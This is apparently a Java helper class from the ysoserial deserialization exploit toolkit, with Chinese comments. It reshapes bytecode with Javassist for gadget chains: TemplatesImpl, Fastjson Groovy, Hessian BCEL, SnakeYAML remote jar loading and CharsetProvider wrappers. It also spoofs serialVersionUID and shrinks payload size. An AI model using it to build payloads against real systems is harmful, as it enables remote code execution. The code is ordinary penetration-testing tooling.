package ysoserial.payloads.util;



// 加载指定路径下的jar包
import javassist.*;
import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;
import org.objectweb.asm.*;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.List;


public class JavassistHelper {
    public static ClassPool pool;

    private static CtClass ctClass;

    private String className;

    private int version;

    private boolean compress = false;

    static {
        pool = ClassPool.getDefault();
        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        pool.insertClassPath(new ClassClassPath(JavassistHelper.class));


    }

    public JavassistHelper(Class clazz) {
        this(clazz.getName());
    }

    public JavassistHelper(String name) {
        try {
            ctClass = pool.get(name);
        } catch (NotFoundException e) {
            ctClass = pool.makeClass(name);
        }
    }

    /**
     * 从字节流中获取
     *
     * @param bytes
     */
    public JavassistHelper(byte[] bytes) {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        try {
            ctClass = pool.makeClass(byteArrayInputStream);
            className = ctClass.getName();
            ctClass.defrost();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public JavassistHelper(CtClass ctClass) {
        this.ctClass = ctClass;
    }

    public static ClassPool getPool() {
        return pool;
    }
    public static CtClass getCtClass() {
        return ctClass;
    }

    public boolean isCompress() {
        return compress;
    }

    public void setCompress(boolean compress) {
        this.compress = compress;
    }

    public String getClassName() {
        return className;
    }

    public void setClassName(String className) {
        if (ctClass.isFrozen()) {
            ctClass.defrost();
        }

        CtClass existing = null;
        try {
            existing = pool.getOrNull(className);
        } catch (Exception ignored) {
        }
        if (existing != null && existing != ctClass) {
            existing.detach();
        }

        ctClass.setName(className);

        this.className = className;
    }

    public void setVersion(int version) {
        this.version = version;
    }

    // 符合TemplatesImpl格式：设置继承自AbstractTranslet类，添加两个transform方法
    public void handleTemplatesImpl(Class abstractTranslet) {
        try {
            this.setSuperClass(abstractTranslet);
            System.out.println("using AbstractTranslet class: " + abstractTranslet);
            // this.addMethod("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}");
            // this.addMethod("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}");
        } catch (Exception e) {
            e.getMessage();
        }
    }

    /**
     * 插入字段
     *
     * @param fieldName
     * @param value
     * @throws Exception
     */
    public void insertField(String fieldName, String value) throws Exception {
        synchronized (JavassistHelper.class) {
            if (ctClass.isFrozen()) {
                ctClass.defrost();
            }

            try {
                CtField field = ctClass.getDeclaredField(fieldName);
                ctClass.removeField(field);
            } catch (javassist.NotFoundException ignored) {
            }
            ctClass.addField(CtField.make(value, ctClass));
        }
    }

    /**
     * 修改为指定suid
     *
     * @param value
     */
    public void setSerialVersionUID(String value) throws Exception {
        insertField("serialVersionUID", "private static final long serialVersionUID = " + value + ";");
    }

    public synchronized static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField field = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(field);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    /**
     * Fastjson Groovy 利用链
     */
    public void handleFastjsonGroovyASTTransformation() {
        implementInterface("org.codehaus.groovy.transform.ASTTransformation");
        addAnnotation("org.codehaus.groovy.transform.GroovyASTTransformation");
    }

    /**
     * 修改一个静态字段的值
     *
     * @param fieldName
     * @param value
     */
    public void modifyStringField(String fieldName, String value) {

        try {
            // 删除字段
            CtField deleteField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(deleteField);

            // 创建字段
            final CtClass stringClass = pool.get(String.class.getName());
            CtField newField = new CtField(stringClass, fieldName, ctClass);
            newField.setModifiers(Modifier.STATIC | Modifier.PUBLIC);
            ctClass.addField(newField, String.format("\"%s\"", value));
        } catch (Exception e) {
        }
    }


    public void modifyBooleanField(String fieldName, boolean value) {
        try {
            // 删除字段
            CtField deleteField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(deleteField);

            // 创建新的布尔字段
            CtField newField = new CtField(CtClass.booleanType, fieldName, ctClass);
            newField.setModifiers(Modifier.STATIC | Modifier.PUBLIC);

            // 使用布尔值初始化字段
            ctClass.addField(newField, CtField.Initializer.byExpr(String.valueOf(value)));
        } catch (Exception e) {
            e.printStackTrace();  // 打印异常的堆栈跟踪
        }
    }

    public void modifyIntField(String fieldName, int value) {
        try {
            // 删除字段
            CtField deleteField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(deleteField);

            // 创建新的int字段
            CtField newField = new CtField(CtClass.intType, fieldName, ctClass);
            newField.setModifiers(Modifier.STATIC | Modifier.PUBLIC);

            // 使用int值初始化字段
            ctClass.addField(newField, CtField.Initializer.constant(value));
        } catch (Exception e) {
            e.printStackTrace();  // 打印异常的堆栈跟踪
        }
    }

    /**
     * 在方法体内添加一个调用无参构造方法逻辑，来触发原本字节码内的入口函数
     * 在Hessian BCEL链中，必须存在 public static void _main(String[] argv) {} 方法，才可以正常执行字节码
     * 注意这里必须先set className，然后再调用这个方法
     */
    public void handleJavaWrapper() throws Exception {
        String methodBody =
            "public static void _main(String[] argv) throws Exception {\n" +
                "new {ClassName}();\n" +
                "}";
        addMethod("_main", methodBody.replace("{ClassName}", className));

    }

    /**
     * 添加静态main入口函数
     */
    public void handleMainFunction() throws Exception {
        String methodBody =
            "public static void main(String[] argv) throws Exception {\n" +
                "new {ClassName}();\n" +
                "}";
        addMethod("main", methodBody.replace("{ClassName}", className));

    }

    /**
     * Charset 格式
     *
     * @throws Exception
     */
    public void handleCharsetWrapper() throws Exception {
        // 设置父类
        setSuperClass(Class.forName("java.nio.charset.spi.CharsetProvider"));

        // 返回非泛型的 Iterator
        // String methodBody1 =
        //         "public java.util.Iterator charsets() {\n" +
        //                 "    return new java.util.HashSet().iterator();\n" +
        //                 "}";
        //
        // addMethod("charsets", methodBody1);

        // 确保 className 包含完全限定的类名
        String methodBody2 =
            "public java.nio.charset.Charset charsetForName(String charsetName) {\n" +
                "    if (charsetName.startsWith(\"" + className + "\")) {\n" +
                "        try {\n" +
                "            new " + className + "();\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "    }\n" +
                "    return java.nio.charset.Charset.forName(\"UTF-8\");\n" +
                "}";

        addMethod("charsetForName", methodBody2);
    }


    // 添加方法
    public void addMethod(String method) {
        CtMethod ctMethod = null;
        try {
            ctMethod = CtMethod.make(method, ctClass);
            ctClass.addMethod(ctMethod);
        } catch (CannotCompileException e) {
            // log.error(e.getMessage());
        }
    }

    public void addMethod(String methodName, String methodBody) throws Exception {
        ctClass.defrost();
        try {
            // 已存在，修改
            CtMethod ctMethod = ctClass.getDeclaredMethod(methodName);
            ctMethod.setBody(methodBody);
        } catch (NotFoundException ignored) {
            // 不存在，直接添加
            CtMethod method = CtNewMethod.make(methodBody, ctClass);
            ctClass.addMethod(method);
        }
    }

    /**
     * 设置父类
     *
     * @param clazz
     */
    public void setSuperClass(Class clazz) {
        CtClass aClass;
        try {
            aClass = pool.get(clazz.getName());
            ctClass.setSuperclass(aClass);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public byte[] getBytecode() {
        try {
            ClassFile classFile = ctClass.getClassFile();
            if (version != 0) {
                classFile.setMajorVersion(version);
            }
            byte[] bytes = ctClass.toBytecode();
            ctClass.detach();

            if (compress) {
                return compressBytecode(bytes);
            }

            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



    public static synchronized AttributeInfo removeAttribute(List<AttributeInfo> attributes, String name) {
        if (attributes == null) return null;

        for (AttributeInfo ai : attributes)
            if (ai.getName().equals(name)) if (attributes.remove(ai)) return ai;

        return null;
    }

    // 实现接口
    public void implementInterface(String interfaceClassName) {
        ctClass.defrost();

        CtClass interfaceClass = pool.makeInterface(interfaceClassName);
        CtClass[] ctClasses = new CtClass[]{interfaceClass};
        ctClass.setInterfaces(ctClasses);
    }

    /**
     * 添加注解
     *
     * @param interfaceClassName
     * @throws Exception
     */
    public void addAnnotation(String interfaceClassName) {
        ctClass.defrost();
        ClassFile classFile = ctClass.getClassFile();
        ConstPool constPool = classFile.getConstPool();
        AnnotationsAttribute clazzAnnotationsAttribute = new AnnotationsAttribute(constPool, AnnotationsAttribute.visibleTag);
        Annotation clazzAnnotation = new Annotation(interfaceClassName.replace(".", "/"), constPool);
        clazzAnnotationsAttribute.setAnnotation(clazzAnnotation);
        ctClass.getClassFile().addAttribute(clazzAnnotationsAttribute);
    }

    /**
     * 设置父类
     *
     * @param superClassName
     * @throws Exception
     */
    public void extendClass(String superClassName) throws Exception {
        ctClass.defrost();
        CtClass interfaceClass = pool.makeClass(superClassName);
        ctClass.setSuperclass(pool.get(interfaceClass.getName()));
    }


    /**
     * snakeyaml 远程加载
     * 实现 javax.script.ScriptEngineFactory 接口，应用于 snakeyaml loadJar 漏洞中
     */
    public void handleSnakeYamlScriptEngineFactory() {
        this.implementInterface("javax.script.ScriptEngineFactory");
    }

    public byte[] compressBytecode(byte[] bytes) {
        // Logger.normal("Origin bytecode length: " + bytes.length);
        ClassReader cr = new ClassReader(bytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        int api = Opcodes.ASM9;
        ClassVisitor cv = new ShortClassVisitor(api, cw);
        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
        cr.accept(cv, parsingOptions);
        byte[] out = cw.toByteArray();
        // log.info("Compress bytecode length: " + out.length);
        // log.info(String.format("The compression ratio is %.2f%%", (float) (bytes.length - out.length) / bytes.length));
        return out;
    }

    /**
     * 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
     */
    public void shrinkBytes() {
        try {
            ClassFile classFile = ctClass.getClassFile2();
            classFile.removeAttribute(SourceFileAttribute.tag);
            classFile.removeAttribute(LineNumberAttribute.tag);
            classFile.removeAttribute(LocalVariableAttribute.tag);
            classFile.removeAttribute(LocalVariableAttribute.typeTag);
            classFile.removeAttribute(DeprecatedAttribute.tag);

            List<javassist.bytecode.MethodInfo> list = classFile.getMethods();
            for (MethodInfo info : list) {
                info.removeAttribute("RuntimeVisibleAnnotations");
                info.removeAttribute("RuntimeInvisibleAnnotations");
            }
        } catch (Throwable e) {
           e.printStackTrace();
        }
    }

    public static Class makeClass(String clazzName) {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = null;
        try {
            clazz = ctClass.toClass();
        } catch (CannotCompileException e) {
           e.printStackTrace();
        }
        ctClass.defrost();
        return clazz;
    }

}


class ShortClassVisitor extends ClassVisitor {
    private final int api;

    public ShortClassVisitor(int api, ClassVisitor classVisitor) {
        super(api, classVisitor);
        this.api = api;
    }

    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
        return new ShortMethodAdapter(this.api, mv);
    }
}

class ShortMethodAdapter extends MethodVisitor implements Opcodes {
    public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
        super(api, methodVisitor);
    }

    @Override
    public void visitLineNumber(int line, Label start) {
        // delete line number
    }
}

